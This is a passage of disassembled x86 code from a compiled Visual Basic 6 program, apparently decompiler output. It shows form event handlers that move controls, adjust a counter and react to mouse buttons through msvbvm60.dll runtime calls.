0087C56B: push eax
0087C56C: lea eax, var_20
0087C56F: push eax
0087C570: call 00410A84h ; Set (object)
0087C575: mov var_30, eax
0087C578: lea eax, var_28
0087C57B: push eax
0087C57C: mov eax, var_30
0087C57F: mov eax, [eax]
0087C581: push var_30
0087C584: call [eax+000000B8h]
0087C58A: fclex 
0087C58C: mov var_34, eax
0087C58F: cmp var_34, 00000000h
0087C593: jnl 87C5AFh
0087C595: push 000000B8h
0087C59A: push 00457C24h
0087C59F: push var_30
0087C5A2: push var_34
0087C5A5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C5AA: mov var_80, eax
0087C5AD: jmp 87C5B3h
0087C5AF: and var_80, 00000000h
0087C5B3: mov ax, var_28
0087C5B7: add ax, 001Eh
0087C5BB: jo 0087CA73h
0087C5C1: push eax
0087C5C2: mov eax, var_38
0087C5C5: mov eax, [eax]
0087C5C7: push var_38
0087C5CA: call [eax+000000BCh]
0087C5D0: fclex 
0087C5D2: mov var_3C, eax
0087C5D5: cmp var_3C, 00000000h
0087C5D9: jnl 87C5F8h
0087C5DB: push 000000BCh
0087C5E0: push 00457C24h
0087C5E5: push var_38
0087C5E8: push var_3C
0087C5EB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C5F0: mov var_00000084, eax
0087C5F6: jmp 87C5FFh
0087C5F8: and var_00000084, 00000000h
0087C5FF: lea eax, var_24
0087C602: push eax
0087C603: lea eax, var_20
0087C606: push eax
0087C607: push 00000002h
0087C609: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087C60E: add esp, 0000000Ch
0087C611: jmp 0087C9F9h
0087C616: mov eax, [ebp+08h]
0087C619: mov eax, [eax]
0087C61B: push [ebp+08h]
0087C61E: call [eax+00000330h]
0087C624: push eax
0087C625: lea eax, var_20
0087C628: push eax
0087C629: call 00410A84h ; Set (object)
0087C62E: mov var_30, eax
0087C631: lea eax, var_28
0087C634: push eax
0087C635: mov eax, var_30
0087C638: mov eax, [eax]
0087C63A: push var_30
0087C63D: call [eax+000000B8h]
0087C643: fclex 
0087C645: mov var_34, eax
0087C648: cmp var_34, 00000000h
0087C64C: jnl 87C66Bh
0087C64E: push 000000B8h
0087C653: push 00457C34h
0087C658: push var_30
0087C65B: push var_34
0087C65E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C663: mov var_00000088, eax
0087C669: jmp 87C672h
0087C66B: and var_00000088, 00000000h
0087C672: mov ax, var_28
0087C676: add ax, 001Eh
0087C67A: jo 0087CA73h
0087C680: xor ecx, ecx
0087C682: test ax, ax
0087C685: setnle cl
0087C688: neg ecx
0087C68A: mov var_38, cx
0087C68E: lea ecx, var_20
0087C691: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087C696: movsx eax, word ptr var_38
0087C69A: test eax, eax
0087C69C: jz 0087C777h
0087C6A2: mov eax, [ebp+08h]
0087C6A5: mov eax, [eax]
0087C6A7: push [ebp+08h]
0087C6AA: call [eax+00000330h]
0087C6B0: push eax
0087C6B1: lea eax, var_24
0087C6B4: push eax
0087C6B5: call 00410A84h ; Set (object)
0087C6BA: mov var_38, eax
0087C6BD: mov eax, [ebp+08h]
0087C6C0: mov eax, [eax]
0087C6C2: push [ebp+08h]
0087C6C5: call [eax+00000330h]
0087C6CB: push eax
0087C6CC: lea eax, var_20
0087C6CF: push eax
0087C6D0: call 00410A84h ; Set (object)
0087C6D5: mov var_30, eax
0087C6D8: lea eax, var_28
0087C6DB: push eax
0087C6DC: mov eax, var_30
0087C6DF: mov eax, [eax]
0087C6E1: push var_30
0087C6E4: call [eax+000000B8h]
0087C6EA: fclex 
0087C6EC: mov var_34, eax
0087C6EF: cmp var_34, 00000000h
0087C6F3: jnl 87C712h
0087C6F5: push 000000B8h
0087C6FA: push 00457C34h
0087C6FF: push var_30
0087C702: push var_34
0087C705: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C70A: mov var_0000008C, eax
0087C710: jmp 87C719h
0087C712: and var_0000008C, 00000000h
0087C719: mov ax, var_28
0087C71D: add ax, 001Eh
0087C721: jo 0087CA73h
0087C727: push eax
0087C728: mov eax, var_38
0087C72B: mov eax, [eax]
0087C72D: push var_38
0087C730: call [eax+000000BCh]
0087C736: fclex 
0087C738: mov var_3C, eax
0087C73B: cmp var_3C, 00000000h
0087C73F: jnl 87C75Eh
0087C741: push 000000BCh
0087C746: push 00457C34h
0087C74B: push var_38
0087C74E: push var_3C
0087C751: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C756: mov var_00000090, eax
0087C75C: jmp 87C765h
0087C75E: and var_00000090, 00000000h
0087C765: lea eax, var_24
0087C768: push eax
0087C769: lea eax, var_20
0087C76C: push eax
0087C76D: push 00000002h
0087C76F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087C774: add esp, 0000000Ch
0087C777: jmp 0087C9F9h
0087C77C: mov eax, [ebp+08h]
0087C77F: cmp [eax+0000008Ch], 00000006h
0087C786: jl 87C78Dh
0087C788: jmp 0087CA34h
0087C78D: mov eax, [ebp+08h]
0087C790: mov eax, [eax+0000008Ch]
0087C796: add eax, 00000001h
0087C799: jo 0087CA73h
0087C79F: mov ecx, [ebp+08h]
0087C7A2: mov [ecx+0000008Ch], eax
0087C7A8: mov eax, [ebp+08h]
0087C7AB: mov eax, [eax]
0087C7AD: push [ebp+08h]
0087C7B0: call [eax+00000334h]
0087C7B6: push eax
0087C7B7: lea eax, var_24
0087C7BA: push eax
0087C7BB: call 00410A84h ; Set (object)
0087C7C0: mov var_38, eax
0087C7C3: mov eax, [ebp+08h]
0087C7C6: mov eax, [eax]
0087C7C8: push [ebp+08h]
0087C7CB: call [eax+00000334h]
0087C7D1: push eax
0087C7D2: lea eax, var_20
0087C7D5: push eax
0087C7D6: call 00410A84h ; Set (object)
0087C7DB: mov var_30, eax
0087C7DE: lea eax, var_28
0087C7E1: push eax
0087C7E2: mov eax, var_30
0087C7E5: mov eax, [eax]
0087C7E7: push var_30
0087C7EA: call [eax+000000B8h]
0087C7F0: fclex 
0087C7F2: mov var_34, eax
0087C7F5: cmp var_34, 00000000h
0087C7F9: jnl 87C818h
0087C7FB: push 000000B8h
0087C800: push 00457C24h
0087C805: push var_30
0087C808: push var_34
0087C80B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C810: mov var_00000094, eax
0087C816: jmp 87C81Fh
0087C818: and var_00000094, 00000000h
0087C81F: mov ax, var_28
0087C823: add ax, 000Ah
0087C827: jo 0087CA73h
0087C82D: push eax
0087C82E: mov eax, var_38
0087C831: mov eax, [eax]
0087C833: push var_38
0087C836: call [eax+000000BCh]
0087C83C: fclex 
0087C83E: mov var_3C, eax
0087C841: cmp var_3C, 00000000h
0087C845: jnl 87C864h
0087C847: push 000000BCh
0087C84C: push 00457C24h
0087C851: push var_38
0087C854: push var_3C
0087C857: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C85C: mov var_00000098, eax
0087C862: jmp 87C86Bh
0087C864: and var_00000098, 00000000h
0087C86B: lea eax, var_24
0087C86E: push eax
0087C86F: lea eax, var_20
0087C872: push eax
0087C873: push 00000002h
0087C875: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087C87A: add esp, 0000000Ch
0087C87D: mov eax, [ebp+08h]
0087C880: mov eax, [eax]
0087C882: push [ebp+08h]
0087C885: call [eax+00000730h]
0087C88B: mov var_30, eax
0087C88E: cmp var_30, 00000000h
0087C892: jnl 87C8B1h
0087C894: push 00000730h
0087C899: push 00441844h
0087C89E: push [ebp+08h]
0087C8A1: push var_30
0087C8A4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C8A9: mov var_0000009C, eax
0087C8AF: jmp 87C8B8h
0087C8B1: and var_0000009C, 00000000h
0087C8B8: jmp 0087C9F9h
0087C8BD: mov eax, [ebp+08h]
0087C8C0: cmp [eax+0000008Ch], 00000000h
0087C8C7: jnle 87C8CEh
0087C8C9: jmp 0087CA34h
0087C8CE: mov eax, [ebp+08h]
0087C8D1: mov eax, [eax+0000008Ch]
0087C8D7: sub eax, 00000001h
0087C8DA: jo 0087CA73h
0087C8E0: mov ecx, [ebp+08h]
0087C8E3: mov [ecx+0000008Ch], eax
0087C8E9: mov eax, [ebp+08h]
0087C8EC: mov eax, [eax]
0087C8EE: push [ebp+08h]
0087C8F1: call [eax+00000334h]
0087C8F7: push eax
0087C8F8: lea eax, var_24
0087C8FB: push eax
0087C8FC: call 00410A84h ; Set (object)
0087C901: mov var_38, eax
0087C904: mov eax, [ebp+08h]
0087C907: mov eax, [eax]
0087C909: push [ebp+08h]
0087C90C: call [eax+00000334h]
0087C912: push eax
0087C913: lea eax, var_20
0087C916: push eax
0087C917: call 00410A84h ; Set (object)
0087C91C: mov var_30, eax
0087C91F: lea eax, var_28
0087C922: push eax
0087C923: mov eax, var_30
0087C926: mov eax, [eax]
0087C928: push var_30
0087C92B: call [eax+000000B8h]
0087C931: fclex 
0087C933: mov var_34, eax
0087C936: cmp var_34, 00000000h
0087C93A: jnl 87C959h
0087C93C: push 000000B8h
0087C941: push 00457C24h
0087C946: push var_30
0087C949: push var_34
0087C94C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C951: mov var_000000A0, eax
0087C957: jmp 87C960h
0087C959: and var_000000A0, 00000000h
0087C960: mov ax, var_28
0087C964: sub ax, 000Ah
0087C968: jo 0087CA73h
0087C96E: push eax
0087C96F: mov eax, var_38
0087C972: mov eax, [eax]
0087C974: push var_38
0087C977: call [eax+000000BCh]
0087C97D: fclex 
0087C97F: mov var_3C, eax
0087C982: cmp var_3C, 00000000h
0087C986: jnl 87C9A5h
0087C988: push 000000BCh
0087C98D: push 00457C24h
0087C992: push var_38
0087C995: push var_3C
0087C998: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C99D: mov var_000000A4, eax
0087C9A3: jmp 87C9ACh
0087C9A5: and var_000000A4, 00000000h
0087C9AC: lea eax, var_24
0087C9AF: push eax
0087C9B0: lea eax, var_20
0087C9B3: push eax
0087C9B4: push 00000002h
0087C9B6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087C9BB: add esp, 0000000Ch
0087C9BE: mov eax, [ebp+08h]
0087C9C1: mov eax, [eax]
0087C9C3: push [ebp+08h]
0087C9C6: call [eax+00000730h]
0087C9CC: mov var_30, eax
0087C9CF: cmp var_30, 00000000h
0087C9D3: jnl 87C9F2h
0087C9D5: push 00000730h
0087C9DA: push 00441844h
0087C9DF: push [ebp+08h]
0087C9E2: push var_30
0087C9E5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C9EA: mov var_000000A8, eax
0087C9F0: jmp 87C9F9h
0087C9F2: and var_000000A8, 00000000h
0087C9F9: mov eax, [ebp+08h]
0087C9FC: mov eax, [eax]
0087C9FE: push [ebp+08h]
0087CA01: call [eax+00000700h]
0087CA07: mov var_30, eax
0087CA0A: cmp var_30, 00000000h
0087CA0E: jnl 87CA2Dh
0087CA10: push 00000700h
0087CA15: push 00441844h
0087CA1A: push [ebp+08h]
0087CA1D: push var_30
0087CA20: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087CA25: mov var_000000AC, eax
0087CA2B: jmp 87CA34h
0087CA2D: and var_000000AC, 00000000h
0087CA34: call 004109C4h ; msvbvm60.dll.__vbaExitProc
0087CA39: push 0087CA54h
0087CA3E: jmp 87CA53h
0087CA40: lea eax, var_24
0087CA43: push eax
0087CA44: lea eax, var_20
0087CA47: push eax
0087CA48: push 00000002h
0087CA4A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087CA4F: add esp, 0000000Ch
0087CA52: ret 
End Sub

Private sub pic__87CA78
0087CA78: push ebp
0087CA79: mov ebp, esp
0087CA7B: sub esp, 00000018h
0087CA7E: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0087CA83: mov eax, fs:[00h]
0087CA89: push eax
0087CA8A: mov fs:[00000000h], esp
0087CA91: mov eax, 000000ACh
0087CA96: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087CA9B: push ebx
0087CA9C: push esi
0087CA9D: push edi
0087CA9E: mov var_18, esp
0087CAA1: mov var_14, 0040D838h
0087CAA8: mov eax, [ebp+08h]
0087CAAB: and eax, 00000001h
0087CAAE: mov var_10, eax
0087CAB1: mov eax, [ebp+08h]
0087CAB4: and al, FEh
0087CAB6: mov [ebp+08h], eax
0087CAB9: mov var_0C, 00000000h
0087CAC0: mov eax, [ebp+08h]
0087CAC3: mov eax, [eax]
0087CAC5: push [ebp+08h]
0087CAC8: call [eax+04h]
0087CACB: mov var_04, 00000001h
0087CAD2: mov var_04, 00000002h
0087CAD9: push FFFFFFFFh
0087CADB: call 00410A60h ; On Error ...
0087CAE0: mov var_04, 00000003h
0087CAE7: mov eax, [ebp+0Ch]
0087CAEA: cmp word ptr [eax], 0001h
0087CAEE: jnz 0087CF7Dh
0087CAF4: mov var_04, 00000004h
0087CAFB: mov eax, [ebp+14h]
0087CAFE: fld real4 ptr [eax]
0087CB00: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087CB05: mov ecx, [ebp+08h]
0087CB08: mov [ecx+00000090h], eax
0087CB0E: mov var_04, 00000005h
0087CB15: mov eax, [ebp+18h]
0087CB18: fld real4 ptr [eax]
0087CB1A: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087CB1F: mov ecx, [ebp+08h]
0087CB22: mov [ecx+00000098h], eax
0087CB28: mov var_04, 00000006h
0087CB2F: mov eax, [ebp+08h]
0087CB32: mov eax, [eax]
0087CB34: push [ebp+08h]
0087CB37: call [eax+00000320h]
0087CB3D: push eax
0087CB3E: lea eax, var_28
0087CB41: push eax
0087CB42: call 00410A84h ; Set (object)
0087CB47: mov var_74, eax
0087CB4A: lea eax, var_70
0087CB4D: push eax
0087CB4E: mov eax, var_74
0087CB51: mov eax, [eax]
0087CB53: push var_74
0087CB56: call [eax+48h]
0087CB59: fclex 
0087CB5B: mov var_78, eax
0087CB5E: cmp var_78, 00000000h
0087CB62: jnl 87CB7Eh
0087CB64: push 00000048h
0087CB66: push 00440DE8h
0087CB6B: push var_74
0087CB6E: push var_78
0087CB71: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087CB76: mov var_000000A0, eax
0087CB7C: jmp 87CB85h
0087CB7E: and var_000000A0, 00000000h
0087CB85: movsx eax, word ptr var_70
0087CB89: mov var_00000088, eax
0087CB8F: mov var_00000084, 00000001h
0087CB99: and var_24, 00000000h
0087CB9D: lea ecx, var_28
0087CBA0: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087CBA5: jmp 87CBB9h
0087CBA7: mov eax, var_24
0087CBAA: add eax, var_00000084
0087CBB0: jo 0087D0B4h
0087CBB6: mov var_24, eax
0087CBB9: mov eax, var_24
0087CBBC: cmp eax, var_00000088
0087CBC2: jnle 0087CF7Dh
0087CBC8: mov var_04, 00000007h
0087CBCF: mov eax, [ebp+08h]
0087CBD2: mov eax, [eax]
0087CBD4: push [ebp+08h]
0087CBD7: call [eax+00000320h]
0087CBDD: push eax
0087CBDE: lea eax, var_28
0087CBE1: push eax
0087CBE2: call 00410A84h ; Set (object)
0087CBE7: mov var_74, eax
0087CBEA: lea eax, var_2C
0087CBED: push eax
0087CBEE: mov ecx, var_24
0087CBF1: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087CBF6: push eax
0087CBF7: mov eax, var_74
0087CBFA: mov eax, [eax]
0087CBFC: push var_74
0087CBFF: call [eax+40h]
0087CC02: fclex 
0087CC04: mov var_78, eax
0087CC07: cmp var_78, 00000000h
0087CC0B: jnl 87CC27h
0087CC0D: push 00000040h
0087CC0F: push 00440DE8h
0087CC14: push var_74
0087CC17: push var_78
0087CC1A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087CC1F: mov var_000000A4, eax
0087CC25: jmp 87CC2Eh
0087CC27: and var_000000A4, 00000000h
0087CC2E: mov eax, var_2C
0087CC31: mov var_7C, eax
0087CC34: fldz 
0087CC36: push ecx
0087CC37: fstp real4 ptr [esp]
0087CC3A: mov eax, var_7C
0087CC3D: mov eax, [eax]
0087CC3F: push var_7C
0087CC42: call [eax+64h]
0087CC45: fclex 
0087CC47: mov var_80, eax
0087CC4A: cmp var_80, 00000000h
0087CC4E: jnl 87CC6Ah
0087CC50: push 00000064h
0087CC52: push 00456A8Ch
0087CC57: push var_7C
0087CC5A: push var_80
0087CC5D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087CC62: mov var_000000A8, eax
0087CC68: jmp 87CC71h
0087CC6A: and var_000000A8, 00000000h
0087CC71: lea eax, var_2C
0087CC74: push eax
0087CC75: lea eax, var_28
0087CC78: push eax
0087CC79: push 00000002h
0087CC7B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087CC80: add esp, 0000000Ch
0087CC83: mov var_04, 00000008h
0087CC8A: mov eax, [ebp+08h]
0087CC8D: mov eax, [eax]
0087CC8F: push [ebp+08h]
0087CC92: call [eax+00000320h]
0087CC98: push eax
0087CC99: lea eax, var_28
0087CC9C: push eax
0087CC9D: call 00410A84h ; Set (object)
0087CCA2: mov var_74, eax
0087CCA5: lea eax, var_2C
0087CCA8: push eax
0087CCA9: mov ecx, var_24
0087CCAC: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087CCB1: push eax
0087CCB2: mov eax, var_74
0087CCB5: mov eax, [eax]
0087CCB7: push var_74
0087CCBA: call [eax+40h]
0087CCBD: fclex 
0087CCBF: mov var_78, eax
0087CCC2: cmp var_78, 00000000h
0087CCC6: jnl 87CCE2h
0087CCC8: push 00000040h
0087CCCA: push 00440DE8h
0087CCCF: push var_74
0087CCD2: push var_78
0087CCD5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087CCDA: mov var_000000AC, eax
0087CCE0: jmp 87CCE9h
0087CCE2: and var_000000AC, 00000000h
0087CCE9: mov eax, var_2C
0087CCEC: mov var_7C, eax
0087CCEF: fldz 
0087CCF1: push ecx
0087CCF2: fstp real4 ptr [esp]
0087CCF5: mov eax, var_7C
0087CCF8: mov eax, [eax]
0087CCFA: push var_7C
0087CCFD: call [eax+74h]
0087CD00: fclex 
0087CD02: mov var_80, eax
0087CD05: cmp var_80, 00000000h
0087CD09: jnl 87CD25h
0087CD0B: push 00000074h
0087CD0D: push 00456A8Ch
0087CD12: push var_7C
0087CD15: push var_80
0087CD18: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087CD1D: mov var_000000B0, eax
0087CD23: jmp 87CD2Ch
0087CD25: and var_000000B0, 00000000h
0087CD2C: lea eax, var_2C
0087CD2F: push eax
0087CD30: lea eax, var_28
0087CD33: push eax
0087CD34: push 00000002h
0087CD36: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087CD3B: add esp, 0000000Ch
0087CD3E: mov var_04, 00000009h
0087CD45: mov eax, [ebp+08h]
0087CD48: mov eax, [eax]
0087CD4A: push [ebp+08h]
0087CD4D: call [eax+00000320h]
0087CD53: push eax
0087CD54: lea eax, var_28
0087CD57: push eax
0087CD58: call 00410A84h ; Set (object)
0087CD5D: mov var_74, eax
0087CD60: lea eax, var_2C
0087CD63: push eax
0087CD64: mov ecx, var_24
0087CD67: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087CD6C: push eax
0087CD6D: mov eax, var_74
0087CD70: mov eax, [eax]
0087CD72: push var_74
0087CD75: call [eax+40h]
0087CD78: fclex 
0087CD7A: mov var_78, eax
0087CD7D: cmp var_78, 00000000h
0087CD81: jnl 87CD9Dh
0087CD83: push 00000040h
0087CD85: push 00440DE8h
0087CD8A: push var_74
0087CD8D: push var_78
0087CD90: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087CD95: mov var_000000B4, eax
0087CD9B: jmp 87CDA4h
0087CD9D: and var_000000B4, 00000000h
0087CDA4: mov eax, var_2C
0087CDA7: mov var_7C, eax
0087CDAA: fldz 
0087CDAC: push ecx
0087CDAD: fstp real4 ptr [esp]
0087CDB0: mov eax, var_7C
0087CDB3: mov eax, [eax]
0087CDB5: push var_7C
0087CDB8: call [eax+6Ch]
0087CDBB: fclex 
0087CDBD: mov var_80, eax
0087CDC0: cmp var_80, 00000000h
0087CDC4: jnl 87CDE0h
0087CDC6: push 0000006Ch
0087CDC8: push 00456A8Ch
0087CDCD: push var_7C
0087CDD0: push var_80
0087CDD3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087CDD8: mov var_000000B8, eax
0087CDDE: jmp 87CDE7h
0087CDE0: and var_000000B8, 00000000h
0087CDE7: lea eax, var_2C
0087CDEA: push eax
0087CDEB: lea eax, var_28
0087CDEE: push eax
0087CDEF: push 00000002h
0087CDF1: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087CDF6: add esp, 0000000Ch
0087CDF9: mov var_04, 0000000Ah
0087CE00: mov eax, [ebp+08h]
0087CE03: mov eax, [eax]
0087CE05: push [ebp+08h]
0087CE08: call [eax+00000320h]
0087CE0E: push eax
0087CE0F: lea eax, var_28
0087CE12: push eax
0087CE13: call 00410A84h ; Set (object)
0087CE18: mov var_74, eax
0087CE1B: lea eax, var_2C
0087CE1E: push eax
0087CE1F: mov ecx, var_24
0087CE22: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087CE27: push eax
0087CE28: mov eax, var_74
0087CE2B: mov eax, [eax]
0087CE2D: push var_74
0087CE30: call [eax+40h]
0087CE33: fclex 
0087CE35: mov var_78, eax
0087CE38: cmp var_78, 00000000h
0087CE3C: jnl 87CE58h
0087CE3E: push 00000040h
0087CE40: push 00440DE8h
0087CE45: push var_74
0087CE48: push var_78
0087CE4B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087CE50: mov var_000000BC, eax
0087CE56: jmp 87CE5Fh
0087CE58: and var_000000BC, 00000000h
0087CE5F: mov eax, var_2C
0087CE62: mov var_7C, eax
0087CE65: fldz 
0087CE67: push ecx
0087CE68: fstp real4 ptr [esp]
0087CE6B: mov eax, var_7C
0087CE6E: mov eax, [eax]
0087CE70: push var_7C
0087CE73: call [eax+7Ch]
0087CE76: fclex 
0087CE78: mov var_80, eax
0087CE7B: cmp var_80, 00000000h
0087CE7F: jnl 87CE9Bh
0087CE81: push 0000007Ch
0087CE83: push 00456A8Ch
0087CE88: push var_7C
0087CE8B: push var_80
0087CE8E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087CE93: mov var_000000C0, eax
0087CE99: jmp 87CEA2h
0087CE9B: and var_000000C0, 00000000h
0087CEA2: lea eax, var_2C
0087CEA5: push eax
0087CEA6: lea eax, var_28
0087CEA9: push eax
0087CEAA: push 00000002h
0087CEAC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087CEB1: add esp, 0000000Ch
0087CEB4: mov var_04, 0000000Bh
0087CEBB: mov eax, [ebp+08h]
0087CEBE: mov eax, [eax]
0087CEC0: push [ebp+08h]
0087CEC3: call [eax+00000320h]
0087CEC9: push eax
0087CECA: lea eax, var_28
0087CECD: push eax
0087CECE: call 00410A84h ; Set (object)
0087CED3: mov var_74, eax
0087CED6: lea eax, var_2C
0087CED9: push eax
0087CEDA: mov ecx, var_24
0087CEDD: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087CEE2: push eax
0087CEE3: mov eax, var_74
0087CEE6: mov eax, [eax]
0087CEE8: push var_74
0087CEEB: call [eax+40h]
0087CEEE: fclex 
0087CEF0: mov var_78, eax
0087CEF3: cmp var_78, 00000000h
0087CEF7: jnl 87CF13h
0087CEF9: push 00000040h
0087CEFB: push 00440DE8h
0087CF00: push var_74
0087CF03: push var_78
0087CF06: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087CF0B: mov var_000000C4, eax
0087CF11: jmp 87CF1Ah
0087CF13: and var_000000C4, 00000000h
0087CF1A: mov eax, var_2C
0087CF1D: mov var_7C, eax
0087CF20: push FFFFFFFFh
0087CF22: mov eax, var_7C
0087CF25: mov eax, [eax]
0087CF27: push var_7C
0087CF2A: call [eax+00000084h]
0087CF30: fclex 
0087CF32: mov var_80, eax
0087CF35: cmp var_80, 00000000h
0087CF39: jnl 87CF58h
0087CF3B: push 00000084h
0087CF40: push 00456A8Ch
0087CF45: push var_7C
0087CF48: push var_80
0087CF4B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087CF50: mov var_000000C8, eax
0087CF56: jmp 87CF5Fh
0087CF58: and var_000000C8, 00000000h
0087CF5F: lea eax, var_2C
0087CF62: push eax
0087CF63: lea eax, var_28
0087CF66: push eax
0087CF67: push 00000002h
0087CF69: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087CF6E: add esp, 0000000Ch
0087CF71: mov var_04, 0000000Ch
0087CF78: jmp 0087CBA7h
0087CF7D: mov var_04, 0000000Eh
0087CF84: mov eax, [ebp+0Ch]
0087CF87: cmp word ptr [eax], 0002h
0087CF8B: jnz 0087D072h
0087CF91: mov var_04, 0000000Fh
0087CF98: mov var_64, 80020004h
0087CF9F: mov var_6C, 0000000Ah
0087CFA6: mov var_54, 80020004h
0087CFAD: mov var_5C, 0000000Ah
0087CFB4: mov var_44, 80020004h
0087CFBB: mov var_4C, 0000000Ah
0087CFC2: mov var_34, 80020004h
0087CFC9: mov var_3C, 0000000Ah
0087CFD0: push 00000010h
0087CFD2: pop eax
0087CFD3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087CFD8: lea esi, var_6C
0087CFDB: mov edi, esp
0087CFDD: movsd 
0087CFDE: movsd 
0087CFDF: movsd 
0087CFE0: movsd 
0087CFE1: push 00000010h
0087CFE3: pop eax
0087CFE4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087CFE9: lea esi, var_5C
0087CFEC: mov edi, esp
0087CFEE: movsd 
0087CFEF: movsd 
0087CFF0: movsd 
0087CFF1: movsd 
0087CFF2: push 00000010h
0087CFF4: pop eax
0087CFF5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087CFFA: lea esi, var_4C
0087CFFD: mov edi, esp
0087CFFF: movsd 
0087D000: movsd 
0087D001: movsd 
0087D002: movsd 
0087D003: push 00000010h
0087D005: pop eax
0087D006: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087D00B: lea esi, var_3C
0087D00E: mov edi, esp
0087D010: movsd 
0087D011: movsd 
0087D012: movsd 
0087D013: movsd 
0087D014: mov eax, [ebp+08h]
0087D017: mov eax, [eax]
0087D019: push [ebp+08h]
0087D01C: call [eax+00000348h]
0087D022: push eax
0087D023: lea eax, var_28
0087D026: push eax
0087D027: call 00410A84h ; Set (object)
0087D02C: push eax
0087D02D: mov eax, [ebp+08h]
0087D030: mov eax, [eax]
0087D032: push [ebp+08h]
0087D035: call [eax+000002BCh]
0087D03B: fclex 
0087D03D: mov var_74, eax
0087D040: cmp var_74, 00000000h
0087D044: jnl 87D063h
0087D046: push 000002BCh
0087D04B: push 00441814h
0087D050: push [ebp+08h]
0087D053: push var_74
0087D056: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087D05B: mov var_000000CC, eax
0087D061: jmp 87D06Ah
0087D063: and var_000000CC, 00000000h
0087D06A: lea ecx, var_28
0087D06D: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087D072: mov var_10, 00000000h
0087D079: wait 
0087D07A: push 0087D095h
0087D07F: jmp 87D094h
0087D081: lea eax, var_2C
0087D084: push eax
0087D085: lea eax, var_28
0087D088: push eax
0087D089: push 00000002h
0087D08B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087D090: add esp, 0000000Ch
0087D093: ret 
End Sub

Private sub pic__87D0B9
0087D0B9: push ebp
0087D0BA: mov ebp, esp
0087D0BC: sub esp, 00000018h
0087D0BF: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0087D0C4: mov eax, fs:[00h]
0087D0CA: push eax
0087D0CB: mov fs:[00000000h], esp
0087D0D2: mov eax, 000000ECh
0087D0D7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087D0DC: push ebx
0087D0DD: push esi
0087D0DE: push edi
0087D0DF: mov var_18, esp
0087D0E2: mov var_14, 0040D8A0h
0087D0E9: mov eax, [ebp+08h]
0087D0EC: and eax, 00000001h
0087D0EF: mov var_10, eax
0087D0F2: mov eax, [ebp+08h]
0087D0F5: and al, FEh
0087D0F7: mov [ebp+08h], eax
0087D0FA: mov var_0C, 00000000h
0087D101: mov eax, [ebp+08h]
0087D104: mov eax, [eax]
0087D106: push [ebp+08h]
0087D109: call [eax+04h]
0087D10C: mov var_04, 00000001h
0087D113: mov var_04, 00000002h
0087D11A: push FFFFFFFFh
0087D11C: call 00410A60h ; On Error ...
0087D121: mov var_04, 00000003h
0087D128: mov eax, [ebp+0Ch]
0087D12B: cmp word ptr [eax], 0001h
0087D12F: jnz 0087DD8Bh
0087D135: mov var_04, 00000004h
0087D13C: mov eax, [ebp+14h]
0087D13F: fld real4 ptr [eax]
0087D141: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087D146: mov ecx, [ebp+08h]
0087D149: mov [ecx+00000094h], eax
0087D14F: mov var_04, 00000005h
0087D156: mov eax, [ebp+18h]
0087D159: fld real4 ptr [eax]
0087D15B: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087D160: mov ecx, [ebp+08h]
0087D163: mov [ecx+0000009Ch], eax
0087D169: mov var_04, 00000006h
0087D170: mov eax, [ebp+08h]
0087D173: mov eax, [eax]
0087D175: push [ebp+08h]
